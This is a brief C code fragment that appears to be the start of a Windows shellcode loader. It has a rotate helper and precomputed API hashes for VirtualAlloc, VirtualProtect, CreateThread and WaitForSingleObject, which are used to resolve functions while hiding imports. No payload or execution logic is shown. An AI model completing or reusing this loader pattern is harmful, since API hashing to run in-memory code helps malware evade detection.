...
static inline uint64_t rotr64(uint64_t n, int bits) {
...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0xAA53B4A4;
    uint32_t h_VirtualProtect = 0xC8D51465;
    uint32_t h_CreateThread = 0x6EF21E5A;
    uint32_t h_WaitForSingleObject = 0xF7DA6F20;
